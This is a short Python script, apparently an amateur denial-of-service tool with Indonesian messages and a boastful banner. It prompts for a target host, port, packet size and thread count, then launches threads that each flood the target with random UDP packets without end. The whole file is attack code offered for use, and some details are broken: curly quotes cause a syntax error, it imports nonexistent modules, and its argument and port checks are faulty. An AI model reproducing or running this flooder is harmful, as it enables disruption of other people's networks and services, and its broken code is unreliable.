try:
    import threading
    import socket
    import random
    import sys
    import os
    import phrase
    import ppl
    
except ImportError as e:
    print(f"\033[1;31m[ERROR] \033[0m\xBB {e}")
    sys.exit()

def random_phrase():
    ppl = ["EXLIPSE#1334", "CYBER-EXLIPSE", "EXLIPSE#1334", "KING-EXLIPSE", "CODE-EXLIPSE", "AUTHOR-EXLIPSE", "STUDIO-EXLIPSE", "KILLER-EXLIPSE", “DDOS-ATTACK”, "EXLIPSE#1334"]
    phrase = ["ada di sini", "melihatmu", "tahu namamu", "tahu lokasimu", "meretas NASA", "mengretas FBI", "meretas kamu", "mencari 4 kamu", "tepat di belakangmu ", "memiliki sensasi"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    print(f"""\033[2;31m
     ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄
    █   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐
    ▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄
       █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █
     ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀
    █                           ▀     █    ▐   ▐     ▐       █     ▐            ▐
    ▐                                 ▐                      ▐ {random_phrase()}

    \033[2;33mVersion: V2.3 \t Author Code : EXLIPSE#1334\n\033[0m
    """)

def DDoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOCK_STREAM)
    while True:
        sock.sendto(random._urandom(size), (ip, port))
        print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m Send Attack Packet Host \033[1;35m{ip} \033[0m And Attack Port \033[1;35m{port}")

def main():
    try:
        if sys.version_info[0] != 3:
            print("\033[1;31m[ERROR] \033[0m\xBB Silakan jalankan Tools Ini menggunakan Python 3")
            sys.exit()
        
        if len(sys.argv) < 5:
            banner()

        IP       = input("\033[1;34m[>] \033[2;32mEnter Attack Target Host \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
        PORT     = int(input("\033[1;34m[>] \033[2;32mEnter Attack Targer Port \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
        SIZE     = int(input("\033[1;34m[>] \033[2;32mEnter Attack Sizee Packet \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
        COUNT    = int(input("\033[1;34m[>] \033[2;32mEnter Attack Size Threads \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])


        if PORT > 1111111 or PORT < 1:
            print("\n\033[1;31m[ERROR] \033[0m\xBB Silakan, pilih port antara 1 dan 1111111")
            sys.exit(1)

        if SIZE > 1111111 or SIZE < 1:
            print("\n\033[1;31m[ERROR] \033[0m\xBB Silakan, pilih Packet antara 1 dan 111111")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] \033[0mExiting...")
        sys.exit()
    
    except Exception as e:
        print(f"\n\033[1;31m[ERROR] \033[0m\xBB {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DDoS, args=(IP, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(f"\n\033[1;31m[ERROR] \033[0m\xBB Terjadi kesalahan saat menginisialisasi Packet {i}: {e}")            

if __name__ == "__main__":
    main()
